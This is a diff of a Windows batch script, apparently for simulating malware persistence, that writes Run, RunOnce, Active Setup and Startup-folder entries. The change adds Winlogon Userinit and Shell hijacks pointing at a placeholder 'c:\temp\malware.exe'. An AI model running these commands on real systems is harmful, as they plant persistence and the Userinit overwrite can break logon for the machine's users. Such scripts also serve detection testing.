@@ -38,8 +38,11 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_S
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d c:\temp\malware.exe /f
 reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}" /v StubPath /t REG_SZ /d c:\temp\malware.exe /f
 
-:: Create files for Startup
+:: Create registry keys for winlogin
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d c:\temp\malware.exe /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\temp\malware.exe" /f
 
+:: Create files for Startup
 echo "C:\Windows\System32\calc.exe" > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\calc.bat"
 echo "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" > "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\powershell.bat"
 
